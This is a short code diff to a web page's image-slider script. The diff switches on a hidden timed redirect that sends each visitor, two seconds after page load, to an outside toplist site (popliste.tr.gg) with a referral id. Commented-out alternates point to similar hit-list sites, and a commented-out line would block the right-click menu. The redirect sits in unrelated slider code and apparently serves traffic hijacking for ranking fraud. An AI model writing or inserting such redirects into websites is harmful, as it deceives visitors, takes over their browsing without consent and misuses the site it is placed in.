@@ -135,15 +135,17 @@ const initSlider = function (currentSlider) {
 }
 for (let i = 0, len = sliders.length; i < len; i++) { initSlider(sliders[i]); }
 
-/* setTimeout(function() {
-  window.location.href = "https://adreslerim.tr.gg?in=94";
-}, 2000); 
+ setTimeout(function() {
+  window.location.href = "https://popliste.tr.gg?in=243";
+}, 2000);
+ /*
 setTimeout(function() {
   window.location.href = "https://toplist29.tr.gg?in=368";
 }, 2000);
 setTimeout(function() {
   window.location.href = "https://hitlist34.tr.gg?in=20";
-}, 2000);*/
+}, 2000);
+*/
 
 
 /* document.addEventListener('contextmenu', event => event.preventDefault());
